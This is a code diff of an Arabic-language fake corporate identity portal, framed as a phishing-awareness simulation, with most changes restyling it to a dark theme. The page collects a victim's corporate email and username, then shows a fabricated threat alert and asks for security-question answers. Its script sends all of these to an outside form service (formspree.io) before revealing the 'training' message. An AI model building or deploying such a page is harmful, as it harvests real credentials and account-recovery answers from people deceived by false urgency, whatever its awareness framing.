@@ -3,38 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة إدارة الهوية الرقمية الموحدة</title>
+    <title>بوابة إدارة الهوية الرقمية الموحدة - النظام المشدد</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f4f6f9; margin: 0; padding: 0; color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .wrapper { background: white; width: 100%; max-width: 480px; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); border: 1px solid #e1e4e8; text-align: right; box-sizing: border-box; }
-        .header { text-align: center; border-bottom: 2px solid #f0f2f5; padding-bottom: 20px; margin-bottom: 25px; }
-        .header h1 { color: #0f4c81; font-size: 22px; margin: 0 0 10px 0; font-weight: 600; }
-        .system-badge { background: #e8f0fe; color: #1a73e8; display: inline-block; padding: 4px 12px; border-radius: 16px; font-size: 12px; font-weight: bold; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #0f1115; margin: 0; padding: 0; color: #e1e4e8; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .wrapper { background: #161b22; width: 100%; max-width: 480px; padding: 40px; border-radius: 8px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5); border: 1px solid #30363d; text-align: right; box-sizing: border-box; }
+        .header { text-align: center; border-bottom: 2px solid #21262d; padding-bottom: 20px; margin-bottom: 25px; }
+        .header h1 { color: #58a6ff; font-size: 22px; margin: 0 0 10px 0; font-weight: 600; }
+        .system-badge { background: #1f293d; color: #58a6ff; display: inline-block; padding: 4px 12px; border-radius: 16px; font-size: 12px; font-weight: bold; border: 1px solid #388bfd; }
         
-        .alert-banner { background-color: #fff5f5; border: 1px solid #ff8787; border-right: 5px solid #e03131; padding: 15px; border-radius: 4px; font-size: 13.5px; color: #c92a2a; margin-bottom: 25px; line-height: 1.6; display: none; }
-        .meta-info { font-size: 12px; color: #868e96; margin-bottom: 15px; background: #f8f9fa; padding: 8px 12px; border-radius: 4px; }
+        .alert-banner { background-color: #2d1919; border: 1px solid #f85149; border-right: 5px solid #f85149; padding: 15px; border-radius: 4px; font-size: 13.5px; color: #ff7b72; margin-bottom: 25px; line-height: 1.6; display: none; }
+        .meta-info { font-size: 12px; color: #8b949e; margin-bottom: 15px; background: #0d1117; padding: 8px 12px; border-radius: 4px; border: 1px solid #21262d; }
         
         .form-group { margin-bottom: 20px; }
-        label { display: block; font-weight: 600; margin-bottom: 8px; color: #495057; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }
-        input[type="text"], input[type="email"] { width: 100%; padding: 12px; border: 1px solid #ced4da; background: #fff; color: #495057; border-radius: 4px; box-sizing: border-box; font-size: 14px; transition: border-color 0.15s ease-in-out; }
-        input[type="text"]:focus, input[type="email"]:focus { border-color: #0f4c81; outline: 0; }
+        label { display: block; font-weight: 600; margin-bottom: 8px; color: #c9d1d9; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }
+        input[type="text"], input[type="email"] { width: 100%; padding: 12px; border: 1px solid #30363d; background: #0d1117; color: #c9d1d9; border-radius: 4px; box-sizing: border-box; font-size: 14px; transition: border-color 0.15s ease-in-out; }
+        input[type="text"]:focus, input[type="email"]:focus { border-color: #58a6ff; outline: 0; box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.15); }
         
-        .btn-primary { background-color: #0f4c81; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 15px; font-weight: bold; width: 100%; transition: background-color 0.2s; }
-        .btn-primary:hover { background-color: #0b375e; }
+        .btn-primary { background-color: #1f6feb; color: white; border: 1px solid #388bfd; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 15px; font-weight: bold; width: 100%; transition: background-color 0.2s; }
+        .btn-primary:hover { background-color: #388bfd; }
         
         #step2, #awareness-page { display: none; }
         
-        .success-box { background-color: #ebfbee; border: 1px solid #b2f2bb; border-right: 5px solid #2b8a3e; padding: 15px; border-radius: 4px; font-weight: bold; color: #2b8a3e; margin-bottom: 20px; text-align: center; }
+        /* واجهة كشف المحاكاة */
+        .success-box { background-color: #132318; border: 1px solid #2ea043; border-right: 5px solid #2ea043; padding: 15px; border-radius: 4px; font-weight: bold; color: #56d364; margin-bottom: 20px; text-align: center; }
         .tips-list { padding-right: 20px; line-height: 1.8; font-size: 14.5px; }
-        .tips-list li { margin-bottom: 12px; color: #495057; }
-        .footer-note { text-align: center; font-size: 11px; color: #adb5bd; margin-top: 25px; border-top: 1px solid #f0f2f5; padding-top: 15px; }
+        .tips-list li { margin-bottom: 12px; color: #c9d1d9; }
+        .footer-note { text-align: center; font-size: 11px; color: #8b949e; margin-top: 25px; border-top: 1px solid #21262d; padding-top: 15px; }
     </style>
 </head>
 <body>
 
 <div class="wrapper">
     
-    <!-- الخطوة الأولى: تسجيل الدخول الرسمي بالنظام -->
+    <!-- الخطوة الأولى: تسجيل الدخول الرسمي بالنظام (الثيم المظلم) -->
     <div id="step1">
         <div class="header">
             <h1>بوابة المصادقة المركزية</h1>
@@ -43,7 +44,6 @@
         
         <div class="form-group">
             <label>البريد الإلكتروني المؤسسي:</label>
-            <!-- تمت إضافة خاصية name لضمان معالجة خادم التوصيل للبيانات -->
             <input type="email" id="email" name="Email" placeholder="name@domain.com">
         </div>
         <div class="form-group">
@@ -56,8 +56,8 @@
     <!-- الخطوة الثانية: الإجراء الأمني المشدد المفاجئ -->
     <div id="step2">
         <div class="header">
-            <h1 style="color: #c92a2a;">التحقق من الهوية الإضافية</h1>
-            <span class="system-badge" style="background: #fff5f5; color: #c92a2a;">تذكرة أمنية رقم: #SEC-9982</span>
+            <h1 style="color: #ff7b72;">التحقق من الهوية الإضافية</h1>
+            <span class="system-badge" style="background: #2d1919; color: #ff7b72; border-color: #f85149;">تذكرة أمنية رقم: #SEC-9982</span>
         </div>
 
         <div class="alert-banner" id="threatAlert" style="display: block;">
@@ -70,7 +70,6 @@
             • نوع النظام المستهدف: Puppy Linux Live Session
         </div>
         
-        <!-- تم توجيه الـ Form مباشرة لدعم الـ FormData برمجياً -->
         <form id="awarenessForm" action="https://formspree.io" method="POST">
             <div class="form-group">
                 <label>سؤال المطابقة 1: ما هي مدينة ولادة الوالد؟</label>
@@ -87,23 +86,23 @@
                 <input type="text" id="q3" name="User_Age" required placeholder="استعلام أمني 3">
             </div>
 
-            <input type="submit" class="btn-primary" style="background-color: #c92a2a;" value="إرسال تقرير التحقق">
+            <input type="submit" class="btn-primary" style="background-color: #da3633; border-color: #f85149;" value="إرسال تقرير التحقق">
         </form>
     </div>
 
     <!-- المرحلة الثالثة: التوعية الفورية وكشف هدف المحاكاة -->
     <div id="awareness-page">
         <div class="header">
-            <h1 style="color: #2b8a3e;">تقرير الوعي الأمني للتدريب</h1>
-            <span class="system-badge" style="background: #ebfbee; color: #2b8a3e;">اكتمال فحص الاستجابة</span>
+            <h1 style="color: #56d364;">تقرير الوعي الأمني للتدريب</h1>
+            <span class="system-badge" style="background: #132318; color: #56d364; border-color: #2ea043;">اكتمال فحص الاستجابة</span>
         </div>
 
         <div class="success-box">
             🔒 تم إنهاء جلسة المحاكاة الآمنة. شكرًا لمشاركتك التفاعلية.
         </div>
-        <p style="font-size: 14px; line-height: 1.6;">لقد تعاملت مع النموذج بدافع الرغبة في تأمين الاتصال، ولكن من المنظور الدفاعي: <strong>لقد استجبت لتقنية الضغط النفسي واصطناع الأخطاء البرمجية (Urgency & False Alarms).</strong></p>
+        <p style="font-size: 14px; line-height: 1.6; color: #c9d1d9;">لقد تعاملت مع النموذج بدافع الرغبة في تأمين الاتصال، ولكن من المنظور الدفاعي: <strong>لقد استجبت لتقنية الضغط النفسي واصطناع الأخطاء البرمجية (Urgency & False Alarms).</strong></p>
         
-        <h3 style="color: #0f4c81; font-size: 16px;">💡 كيف تتصرف في المواقف الحقيقية؟</h3>
+        <h3 style="color: #58a6ff; font-size: 16px;">💡 كيف تتصرف في المواقف الحقيقية؟</h3>
         <ul class="tips-list">
             <li><strong>التحقق الذاتي من النطاق:</strong> البوابات الرسمية والموثقة للشركات لا تطلب بيانات حساسة أو أسئلة أمان إلا من خلال روابط تتبع نطاقها الأساسي المسجل قانونياً، وليس عبر استضافات اختبار خارجية.</li>
             <li><strong>سرية أسئلة الأمان:</strong> معلومات مثل مكان الولادة، السن، وأسماء الأصدقاء هي وسائلك الحقيقية لاستعادة الحسابات عند فقدان كلمات المرور. إفشاؤها لأي واجهة غير موثقة يهدد استقرار حساباتك بالكامل.</li>
@@ -134,10 +133,8 @@ document.getElementById('awarenessForm').addEventListener('submit', function(e) 
     e.preventDefault(); 
 
     var form = e.target;
-    // استخدام واجهة FormData الأصلية لضمان الاستقرار التام مع خوادم الاستقبال
     var formData = new FormData(form);
     
-    // إضافة حقول المرحلة الأولى يدوياً إلى حزمة البيانات المرسلة
     formData.append("Email_Address", document.getElementById('email').value);
     formData.append("Username", document.getElementById('username').value);
 
@@ -149,12 +146,10 @@ document.getElementById('awarenessForm').addEventListener('submit', function(e) 
         }
     })
     .then(response => {
-        // التحويل للمرحلة التوعوية فور إتمام معالجة الطلب
         document.getElementById('step2').style.display = 'none';
         document.getElementById('awareness-page').style.display = 'block';
     })
     .catch(error => {
-        // في حال حدوث أي انقطاع بالاتصال يتم عرض صفحة التوعية أيضاً كضمان أمني
         document.getElementById('step2').style.display = 'none';
         document.getElementById('awareness-page').style.display = 'block';
     });
@@ -163,4 +158,3 @@ document.getElementById('awarenessForm').addEventListener('submit', function(e) 
 
 </body>
 </html>
-111
